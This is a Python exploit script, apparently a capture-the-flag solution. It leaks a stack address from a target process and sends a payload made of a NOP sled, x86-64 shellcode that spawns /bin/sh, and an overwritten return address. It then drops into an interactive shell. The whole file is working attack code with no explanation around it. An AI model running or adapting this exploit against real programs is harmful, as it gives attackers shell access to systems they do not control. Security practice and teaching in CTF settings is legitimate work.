import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
first_data = p.readuntil('today? [0-3]')
print(first_data)
p.sendline("9")
second_data = p.readuntil('!')
print(second_data)
split = str(second_data).split(' ')
split2 = split[7].replace("!'", "")
split3 = int(split2,16)
print(hex(split3))

payload =  b"\x90" * 15
payload += b"\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x54\x5F\x6A\x3B\x58\x31\xD2\x0F\x05"
payload += b"\x90" * 2
payload += p64(split3)
payload += b"B" * 8
payload += b"\x90\xed\xff\xff\xff\x7f"
p.sendline(payload)

p.interactive()
